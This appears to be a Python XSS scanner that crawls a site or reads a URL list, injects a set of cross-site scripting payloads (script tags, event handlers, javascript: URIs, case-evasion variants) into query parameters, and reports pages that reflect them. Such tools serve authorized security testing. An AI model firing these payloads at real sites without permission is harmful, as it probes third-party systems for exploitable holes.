#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XSS Scanner (Crawling & Target Testing Modes)
Author: Ian Lusule
"""

# Import colorama for cross-platform color display
has_colorama = False
try:
    from colorama import init, Fore, Style
    has_colorama = True
except ImportError:
    pass

import requests
import argparse
import re
import os
import concurrent.futures
import threading
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from bs4 import BeautifulSoup
import time

class XSSScanner:
    """XSS Scanner with crawling and direct testing modes"""

    def __init__(self, threads=10, timeout=10, user_agent=None, output_file=None):
        self.threads = threads
        self.timeout = timeout
        self.user_agent = user_agent or 'XSSScanner/1.0'
        self.session = requests.Session()
        self.session.headers['User-Agent'] = self.user_agent
        self.lock = threading.Lock()
        self.visited = set()
        self.output_file = output_file

        # XSS test vectors
        self.xss_vectors = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",

            # Attribute-based XSS
            "' onmouseover='alert(1)",
            "' onclick='alert(1)",

            # Evasion techniques
            "<scRipt>alert('XSS')</scRipt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(\'XSS\')</script>",
            "<script>alert(\"XSS\")</script>",

            # Specialized payloads
            "<iframe src=\"javascript:alert('XSS')\">",
            "<body onload=alert('XSS')>",
            "<a href=\"javascript:alert('XSS')\">click</a>",
            "<img src=\"javascript:alert('XSS')\">",
            "<div style=\"background-image:url(javascript:alert('XSS'))\">",
            "<input type=\"text\" value=\"\" onfocus=alert('XSS') autofocus>"
        ]

    def test_url(self, url):
        """
        Tests a single URL for XSS vulnerabilities

        Parameters:
            url (str): URL to test

        Returns:
            bool: True if vulnerable, False otherwise
        """
        parsed = urlparse(url)
        if not parsed.query:
            return False

        query_params = parse_qs(parsed.query)
        vulnerable = False

        for param in query_params:
            for vector in self.xss_vectors:
                modified_params = query_params.copy()
                modified_params[param] = [vector]
                modified_query = urlencode(modified_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{modified_query}"

                try:
                    response = self.session.get(test_url, timeout=self.timeout)

                    # Check if the vector is reflected in the response
                    if vector in response.text:
                        vulnerable = True
                        break  # Stop testing this parameter after first vulnerability
                except Exception:
                    continue

            if vulnerable:
                break  # Stop testing other parameters

        return vulnerable

    def print_vulnerable(self, url):
        """
        Prints the vulnerable URL to terminal with optional color
        """
        with self.lock:
            if has_colorama:
                print(f"{Fore.GREEN}{url}{Style.RESET_ALL}")
            else:
                print(url)

    def write_to_output(self, url):
        """
        Appends the vulnerable URL to the output file if specified
        """
        if self.output_file:
            with self.lock:
                with open(self.output_file, 'a') as f:
                    f.write(url + '\n')

    def crawl_and_test(self, start_url, max_depth):
        """
        Crawls website and tests URLs for XSS vulnerabilities

        Parameters:
            start_url (str): Starting URL for crawling
            max_depth (int): Maximum depth to crawl
        """
        self.visited = set()

        # BFS queue: (url, current_depth)
        queue = [(start_url, 0)]

        while queue:
            url, depth = queue.pop(0)

            if url in self.visited or depth > max_depth:
                continue

            self.visited.add(url)

            # Test the current URL
            if self.test_url(url):
                self.print_vulnerable(url)
                self.write_to_output(url)

            # Crawl deeper if needed
            if depth < max_depth:
                try:
                    response = self.session.get(url, timeout=self.timeout)
                    if response.status_code == 200 and 'text/html' in response.headers.get('Content-Type', ''):
                        soup = BeautifulSoup(response.text, 'html.parser')
                        for link in soup.find_all('a', href=True):
                            next_url = urljoin(url, link['href'])
                            parsed = urlparse(next_url)
                            if parsed.netloc == urlparse(start_url).netloc:
                                if next_url not in self.visited:
                                    queue.append((next_url, depth + 1))
                except Exception:
                    continue

    def target_testing_mode(self, urls):
        """
        Directly tests provided URLs without crawling

        Parameters:
            urls (list): URLs to test
        """
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_url = {executor.submit(self.test_url, url): url for url in urls}
            for future in concurrent.futures.as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    if future.result():
                        self.print_vulnerable(url)
                        self.write_to_output(url)
                except Exception:
                    pass

def clear_screen():
    """Clears the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Prints the tool banner with optional color support"""
    if has_colorama:
        banner = f"""{Fore.RED}
██╗  ██╗███████╗███████╗
╚██╗██╔╝██╔════╝██╔════╝
 ╚███╔╝ ███████╗███████╗
 ██╔██╗ ╚════██║╚════██║
██╔╝ ██╗███████║███████║
╚═╝  ╚═╝╚══════╝╚══════╝
{Fore.CYAN}Cross-Site Scripting Scanner{Style.RESET_ALL}
{Fore.YELLOW}Author: Ian Lusule (https://github.com/Ian-Lusule){Style.RESET_ALL}
{Fore.GREEN}Target Testing Mode: -Tt{Style.RESET_ALL}
{Fore.GREEN}Crawling Mode: -d [depth]{Style.RESET_ALL}
==================================================
"""
    else:
        banner = r"""
 __   __  _____   _____
 \ \ / / /  ___| /  ___|
  \ V /  \ `--.  \ `--.
   \ /    `--. \  `--. \
   | |   /\__/ / /\__/ /
   \_/   \____/  \____/

Cross-Site Scripting Scanner
Author: Ian Lusule (https://github.com/Ian-Lusule)
Target Testing Mode: -Tt
Crawling Mode: -d [depth]
==================================================
"""
    print(banner)

def main():
    """Main function to run the scanner"""
    # Initialize colorama if available
    if has_colorama:
        init(autoreset=True)

    # Clear the screen
    clear_screen()

    # Print the tool banner
    print_banner()

    # Setup command line arguments
    parser = argparse.ArgumentParser(
        description='XSS Scanner - Crawling & Target Testing Modes',
        epilog='Examples:\n'
               '  Target Testing: python xss_scanner.py -Tt -f urls.txt\n'
               '  Crawling Mode: python xss_scanner.py -d 2 -u http://example.com',
        add_help=False
    )

    # Mode selection
    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument('-Tt', '--target-testing', action='store_true',
                           help='Target testing mode (direct URL testing)')
    mode_group.add_argument('-d', '--depth', type=int,
                           help='Crawling depth (crawling mode)')

    # Target specification
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-u', '--url',
                             help='Single target URL for crawling mode')
    target_group.add_argument('-f', '--file',
                             help='File containing URLs for target testing mode')

    # Other options
    parser.add_argument('-t', '--threads', type=int, default=15,
                        help='Number of threads (default: 15)')
    parser.add_argument('-T', '--timeout', type=int, default=8,
                        help='Request timeout in seconds (default: 8)')
    parser.add_argument('-a', '--user-agent',
                        help='Custom User Agent string')
    parser.add_argument('-o', '--output',
                        help='Output file for vulnerable URLs')
    parser.add_argument('-h', '--help', action='store_true',
                        help='Show help message and exit')

    # Parse arguments
    args = parser.parse_args()

    # Handle help option
    if args.help:
        parser.print_help()
        return

    # Validate mode-specific requirements
    if args.target_testing and not args.file:
        print("Error: Target testing mode requires -f/--file")
        return
    if args.depth is not None and not args.url:
        print("Error: Crawling mode requires -u/--url")
        return

    # Create scanner instance
    scanner = XSSScanner(
        threads=args.threads,
        timeout=args.timeout,
        user_agent=args.user_agent,
        output_file=args.output
    )

    # Target Testing Mode
    if args.target_testing:
        try:
            with open(args.file, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]

            if not urls:
                return

            print(f"Testing {len(urls)} URLs in target testing mode...")
            scanner.target_testing_mode(urls)
        except Exception as e:
            if has_colorama:
                print(f"{Fore.RED}Error reading file: {str(e)}{Style.RESET_ALL}")
            else:
                print(f"Error reading file: {str(e)}")
            return

    # Crawling Mode
    elif args.depth is not None:
        print(f"Crawling {args.url} with depth {args.depth}...")
        scanner.crawl_and_test(args.url, args.depth)

if __name__ == "__main__":
    main()
